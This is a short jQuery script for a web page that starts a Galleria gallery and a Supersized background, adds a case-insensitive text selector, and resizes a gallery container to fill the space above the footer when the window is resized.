jQuery(function($){
        
       loadGalleria();
       loadSupersized(); 
       
       jQuery.expr[':'].Contains = function(a, i, m) { 
          return jQuery(a).text().toUpperCase().indexOf(m[3].toUpperCase()) >= 0; 
        };
        
       $( window ).bind( 'resize', $.debounce( 250, false, fixCss ) );
});

function fixCss(){
  if($(".galeriaMain").length > 0){
    var alturaGaleria = $(".galeriaMain").position().top;
    var alturaFooter = $(".divFooter2").position().top;
    $(".divGaleriaContainer").height(alturaFooter - alturaGaleria);
  }
}        
        
        
